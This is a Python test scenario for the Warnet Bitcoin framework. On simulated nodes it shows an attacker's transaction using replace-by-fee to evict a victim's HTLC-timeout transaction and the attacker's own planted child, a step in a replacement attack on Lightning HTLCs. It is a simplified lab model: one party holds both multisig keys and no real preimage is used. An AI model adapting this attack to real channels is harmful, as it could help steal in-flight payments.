#!/usr/bin/env python3

"""
Test scenario: Mallory's HTLC-preimage replaces Bob's HTLC-timeout via RBF.

THIS IS THE CORE OF THE ATTACK.

The sequence:
  1. Create HTLC output (2-of-2 multisig, confirmed)
  2. Create Box M (confirmed UTXO Mallory controls)
  3. Broadcast m_child (spends Box M, in mempool)
  4. Broadcast htlc_timeout (Bob spends HTLC output, in mempool)
  5. Broadcast htlc_preimage (Mallory spends HTLC output AND Box M)
     → RBF evicts BOTH htlc_timeout AND m_child

Run: warnet run scenarios/test_preimage_replacement.py --debug

Assertions after step 5:
  - htlc_preimage IS in the mempool
  - htlc_timeout is NOT in the mempool (evicted)
  - m_child is NOT in the mempool (evicted)
"""

import hashlib
from typing import Dict, Tuple

from commander import Commander
from test_framework.test_node import TestNode
from test_framework.key import ECKey


# ---------------------------------------------------------------------------
# Helpers — wallet, funding, keys (proven in prior tests)
# ---------------------------------------------------------------------------

def setup_wallets(alice: TestNode, bob: TestNode, mallory: TestNode) -> None:
    for node, name in [(alice, "alice"), (bob, "bob"), (mallory, "mallory")]:
        wallets = node.listwallets()
        if name not in wallets:
            node.createwallet(name, descriptors=True)


def fund_miner(alice: TestNode, blocks: int = 101) -> str:
    addr: str = alice.getnewaddress()
    alice.rpc.generatetoaddress(blocks, addr)
    return addr


def fund_participants(
    alice: TestNode, bob: TestNode, mallory: TestNode,
    miner_addr: str, amount: float = 10.0,
) -> Tuple[str, str]:
    bob_addr: str = bob.getnewaddress()
    mallory_addr: str = mallory.getnewaddress()
    alice.sendtoaddress(bob_addr, amount)
    alice.sendtoaddress(mallory_addr, amount)
    alice.rpc.generatetoaddress(1, miner_addr)
    return bob_addr, mallory_addr


def generate_keypair() -> Tuple[ECKey, str]:
    key: ECKey = ECKey()
    key.generate(compressed=True)
    pubkey_hex: str = key.get_pubkey().get_bytes().hex()
    return key, pubkey_hex


def eckey_to_wif(key: ECKey, testnet: bool = True) -> str:
    prefix: bytes = b'\xef' if testnet else b'\x80'
    privkey_bytes: bytes = key.get_bytes()
    extended: bytes = prefix + privkey_bytes + b'\x01'
    checksum: bytes = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
    return _base58_encode(extended + checksum)


def _base58_encode(data: bytes) -> str:
    alphabet: str = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num: int = int.from_bytes(data, 'big')
    result: str = ''
    while num > 0:
        num, remainder = divmod(num, 58)
        result = alphabet[remainder] + result
    for byte in data:
        if byte == 0:
            result = '1' + result
        else:
            break
    return result


# ---------------------------------------------------------------------------
# Helpers — HTLC output (from test_htlc.py)
# ---------------------------------------------------------------------------

def create_htlc_output(
    alice: TestNode, miner_addr: str, htlc_amount: float = 1.0,
) -> Dict[str, object]:
    bob_key, bob_pubkey = generate_keypair()
    mallory_key, mallory_pubkey = generate_keypair()
    bob_wif: str = eckey_to_wif(bob_key)
    mallory_wif: str = eckey_to_wif(mallory_key)

    multisig: dict = alice.createmultisig(2, [bob_pubkey, mallory_pubkey])
    htlc_txid: str = alice.sendtoaddress(multisig["address"], htlc_amount)
    alice.rpc.generatetoaddress(1, miner_addr)

    wallet_tx: dict = alice.gettransaction(htlc_txid)
    decoded: dict = alice.decoderawtransaction(wallet_tx["hex"])
    htlc_vout: int = None
    htlc_scriptPubKey: str = None
    for vout in decoded["vout"]:
        if abs(float(vout["value"]) - htlc_amount) < 0.0001:
            htlc_vout = vout["n"]
            htlc_scriptPubKey = vout["scriptPubKey"]["hex"]
            break
    assert htlc_vout is not None, "Could not find HTLC output"

    return {
        "htlc_txid": htlc_txid, "htlc_vout": htlc_vout,
        "htlc_amount": htlc_amount, "htlc_scriptPubKey": htlc_scriptPubKey,
        "redeem_script": multisig["redeemScript"], "multisig_address": multisig["address"],
        "bob_pubkey": bob_pubkey, "mallory_pubkey": mallory_pubkey,
        "bob_wif": bob_wif, "mallory_wif": mallory_wif,
    }


# ---------------------------------------------------------------------------
# Helpers — Box M and M-child (from test_box_m.py)
# ---------------------------------------------------------------------------

def create_box_m(
    alice: TestNode, mallory: TestNode, miner_addr: str, amount: float = 0.1,
) -> Dict[str, object]:
    mallory_addr: str = mallory.getnewaddress()
    box_m_txid: str = alice.sendtoaddress(mallory_addr, amount)
    alice.rpc.generatetoaddress(1, miner_addr)

    wallet_tx: dict = alice.gettransaction(box_m_txid)
    decoded: dict = alice.decoderawtransaction(wallet_tx["hex"])
    box_m_vout: int = None
    box_m_amount: float = None
    box_m_scriptPubKey: str = None
    for vout in decoded["vout"]:
        if vout["scriptPubKey"].get("address") == mallory_addr:
            box_m_vout = vout["n"]
            box_m_amount = float(vout["value"])
            box_m_scriptPubKey = vout["scriptPubKey"]["hex"]
            break
    assert box_m_vout is not None, "Could not find Box M output"

    return {
        "box_m_txid": box_m_txid, "box_m_vout": box_m_vout,
        "box_m_amount": box_m_amount, "box_m_address": mallory_addr,
        "box_m_scriptPubKey": box_m_scriptPubKey,
    }


def create_m_child(
    mallory: TestNode, box_m: Dict[str, object], fee_rate_sat_vb: int = 1,
) -> Dict[str, str]:
    mallory_change_addr: str = mallory.getnewaddress()
    tx_size_vb: int = 150
    fee_btc: float = (fee_rate_sat_vb * tx_size_vb) / 1e8

    inputs: list = [{
        "txid": box_m["box_m_txid"],
        "vout": box_m["box_m_vout"],
        "sequence": 0xFFFFFFFD,
    }]
    outputs: dict = {mallory_change_addr: round(box_m["box_m_amount"] - fee_btc, 8)}

    raw_hex: str = mallory.createrawtransaction(inputs, outputs)
    signed: dict = mallory.signrawtransactionwithwallet(raw_hex)
    assert signed["complete"], f"m_child signing failed: {signed.get('errors')}"

    m_child_txid: str = mallory.sendrawtransaction(signed["hex"])
    return {"m_child_txid": m_child_txid, "m_child_hex": signed["hex"]}


# ---------------------------------------------------------------------------
# Helpers — htlc_timeout (from test_htlc_timeout.py)
# ---------------------------------------------------------------------------

def create_htlc_timeout(
    node: TestNode, htlc: Dict[str, object],
    dest_address: str, fee_rate_sat_vb: int = 2,
) -> Dict[str, object]:
    tx_size_vb: int = 300
    fee_btc: float = (fee_rate_sat_vb * tx_size_vb) / 1e8

    inputs: list = [{
        "txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"],
        "sequence": 0xFFFFFFFD,
    }]
    outputs: dict = {dest_address: round(htlc["htlc_amount"] - fee_btc, 8)}
    raw_hex: str = node.createrawtransaction(inputs, outputs)

    prevtxs: list = [{
        "txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"],
        "scriptPubKey": htlc["htlc_scriptPubKey"],
        "redeemScript": htlc["redeem_script"],
        "amount": htlc["htlc_amount"],
    }]
    signed: dict = node.signrawtransactionwithkey(
        raw_hex, [htlc["bob_wif"], htlc["mallory_wif"]], prevtxs,
    )
    assert signed["complete"], f"htlc_timeout signing failed: {signed.get('errors')}"

    return {
        "htlc_timeout_hex": signed["hex"],
        "htlc_timeout_fee": fee_btc,
        "htlc_timeout_fee_rate": fee_rate_sat_vb,
    }


# ---------------------------------------------------------------------------
# Helpers — htlc_preimage (NEW — the attack transaction)
# ---------------------------------------------------------------------------

def create_htlc_preimage(
    node: TestNode,
    htlc: Dict[str, object],
    box_m: Dict[str, object],
    mallory: TestNode,
    dest_address: str,
    fee_rate_sat_vb: int = 10,
) -> Dict[str, object]:
    """
    Create Mallory's HTLC-preimage transaction.

    Spends TWO inputs:
      1. htlc_output (the HTLC multisig — conflicts with Bob's htlc_timeout)
      2. box_m (the planted input — conflicts with m_child)

    Fee must be higher than htlc_timeout fee + m_child fee COMBINED.
    Must signal RBF on all inputs.

    The HTLC input is signed with signrawtransactionwithkey (both multisig keys).
    The Box M input is signed with signrawtransactionwithwallet (Mallory's wallet).

    Returns:
        dict with htlc_preimage_hex, htlc_preimage_fee
    """
    total_input: float = htlc["htlc_amount"] + box_m["box_m_amount"]

    # Fee must exceed both evicted txs combined
    tx_size_vb: int = 400  # 2 inputs (one multisig, one single-key), 1 output
    fee_btc: float = (fee_rate_sat_vb * tx_size_vb) / 1e8

    inputs: list = [
        {
            "txid": htlc["htlc_txid"],
            "vout": htlc["htlc_vout"],
            "sequence": 0xFFFFFFFD,
        },
        {
            "txid": box_m["box_m_txid"],
            "vout": box_m["box_m_vout"],
            "sequence": 0xFFFFFFFD,
        },
    ]
    outputs: dict = {dest_address: round(total_input - fee_btc, 8)}

    raw_hex: str = node.createrawtransaction(inputs, outputs)

    # Step 1: Sign the HTLC input (multisig) with explicit keys
    prevtxs: list = [
        {
            "txid": htlc["htlc_txid"],
            "vout": htlc["htlc_vout"],
            "scriptPubKey": htlc["htlc_scriptPubKey"],
            "redeemScript": htlc["redeem_script"],
            "amount": htlc["htlc_amount"],
        },
        {
            "txid": box_m["box_m_txid"],
            "vout": box_m["box_m_vout"],
            "scriptPubKey": box_m["box_m_scriptPubKey"],
            "amount": box_m["box_m_amount"],
        },
    ]

    partially_signed: dict = node.signrawtransactionwithkey(
        raw_hex,
        [htlc["bob_wif"], htlc["mallory_wif"]],
        prevtxs,
    )

    # Step 2: Sign the Box M input with Mallory's wallet
    fully_signed: dict = mallory.signrawtransactionwithwallet(partially_signed["hex"])
    assert fully_signed["complete"], (
        f"htlc_preimage signing incomplete: {fully_signed.get('errors')}"
    )

    return {
        "htlc_preimage_hex": fully_signed["hex"],
        "htlc_preimage_fee": fee_btc,
        "htlc_preimage_fee_rate": fee_rate_sat_vb,
    }


# ---------------------------------------------------------------------------
# Scenario
# ---------------------------------------------------------------------------

class TestPreimageReplacement(Commander):

    def set_test_params(self) -> None:
        self.num_nodes = 3

    def add_options(self, parser) -> None:
        parser.description = "Test HTLC-preimage replacement of HTLC-timeout via RBF"
        parser.usage = "warnet run /path/to/test_preimage_replacement.py"

    def run_test(self) -> None:
        self.log.info("Waiting for L1 p2p network connections...")
        self.wait_for_tanks_connected()

        alice: TestNode = self.nodes[0]
        bob: TestNode = self.nodes[1]
        mallory: TestNode = self.nodes[2]

        # --- Setup ---
        self.log.info("Setting up wallets and funding...")
        setup_wallets(alice, bob, mallory)
        miner_addr: str = fund_miner(alice, blocks=101)
        fund_participants(alice, bob, mallory, miner_addr, amount=10.0)

        # --- Step 1: Create HTLC output ---
        htlc_amount: float = 1.0
        self.log.info(f"[1] Creating HTLC output ({htlc_amount} BTC)...")
        htlc: dict = create_htlc_output(alice, miner_addr, htlc_amount=htlc_amount)
        self.log.info(f"    HTLC output: {htlc['htlc_txid'][:16]}...:{htlc['htlc_vout']}")

        # --- Step 2: Create Box M ---
        self.log.info("[2] Creating Box M...")
        box_m: dict = create_box_m(alice, mallory, miner_addr, amount=0.1)
        self.log.info(f"    Box M: {box_m['box_m_txid'][:16]}...:{box_m['box_m_vout']} ({box_m['box_m_amount']} BTC)")

        # --- Step 3: Broadcast m_child (spends Box M) ---
        self.log.info("[3] Broadcasting m_child (spends Box M)...")
        m_child: dict = create_m_child(mallory, box_m, fee_rate_sat_vb=1)
        self.sync_all()
        self.log.info(f"    m_child in mempool: {m_child['m_child_txid'][:16]}...")

        # --- Step 4: Broadcast htlc_timeout (Bob spends HTLC output) ---
        bob_dest: str = bob.getnewaddress()
        self.log.info("[4] Broadcasting htlc_timeout (Bob spends HTLC output)...")
        timeout: dict = create_htlc_timeout(bob, htlc, bob_dest, fee_rate_sat_vb=2)
        timeout_txid: str = bob.sendrawtransaction(timeout["htlc_timeout_hex"])
        self.sync_all()
        self.log.info(f"    htlc_timeout in mempool: {timeout_txid[:16]}...")

        # Verify both are in mempool before the replacement
        mempool: list = alice.getrawmempool()
        assert m_child["m_child_txid"] in mempool, "m_child should be in mempool"
        assert timeout_txid in mempool, "htlc_timeout should be in mempool"
        self.log.info(f"    Mempool has {len(mempool)} txs (m_child + htlc_timeout)")

        # --- Step 5: THE REPLACEMENT — broadcast htlc_preimage ---
        mallory_dest: str = mallory.getnewaddress()
        self.log.info("[5] Broadcasting htlc_preimage (THE REPLACEMENT)...")
        self.log.info("    Spends: HTLC output (conflicts with htlc_timeout)")
        self.log.info("    Spends: Box M (conflicts with m_child)")

        preimage: dict = create_htlc_preimage(
            alice, htlc, box_m, mallory, mallory_dest, fee_rate_sat_vb=10,
        )
        preimage_txid: str = mallory.sendrawtransaction(preimage["htlc_preimage_hex"])
        self.sync_all()
        self.log.info(f"    htlc_preimage txid: {preimage_txid[:16]}...")

        # --- CRITICAL ASSERTIONS ---
        mempool_after: list = alice.getrawmempool()

        # htlc_preimage IS in the mempool
        assert preimage_txid in mempool_after, (
            "FAIL: htlc_preimage is NOT in the mempool"
        )
        self.log.info("    ✓ htlc_preimage IS in the mempool")

        # htlc_timeout is NOT in the mempool (evicted by RBF)
        assert timeout_txid not in mempool_after, (
            "FAIL: htlc_timeout should have been evicted but is still in mempool"
        )
        self.log.info("    ✓ htlc_timeout EVICTED from mempool")

        # m_child is NOT in the mempool (evicted — conflicted via Box M)
        assert m_child["m_child_txid"] not in mempool_after, (
            "FAIL: m_child should have been evicted but is still in mempool"
        )
        self.log.info("    ✓ m_child EVICTED from mempool")

        # --- Summary ---
        self.log.info("========================================")
        self.log.info("  TEST PREIMAGE REPLACEMENT — ALL PASSED")
        self.log.info("========================================")
        self.log.info(f"  HTLC output:     {htlc['htlc_txid'][:16]}...:{htlc['htlc_vout']}")
        self.log.info(f"  Box M:           {box_m['box_m_txid'][:16]}...:{box_m['box_m_vout']}")
        self.log.info(f"  m_child:         {m_child['m_child_txid'][:16]}... → EVICTED")
        self.log.info(f"  htlc_timeout:    {timeout_txid[:16]}... → EVICTED")
        self.log.info(f"  htlc_preimage:   {preimage_txid[:16]}... → IN MEMPOOL")
        self.log.info(f"  Preimage fee:    {preimage['htlc_preimage_fee']} BTC ({preimage['htlc_preimage_fee_rate']} sat/vB)")
        self.log.info(f"  Timeout fee:     {timeout['htlc_timeout_fee']} BTC ({timeout['htlc_timeout_fee_rate']} sat/vB)")
        self.log.info("========================================")
        self.log.info("  RBF REPLACEMENT ATTACK WORKS")
        self.log.info("========================================")


def main():
    TestPreimageReplacement().main()


if __name__ == "__main__":
    main()
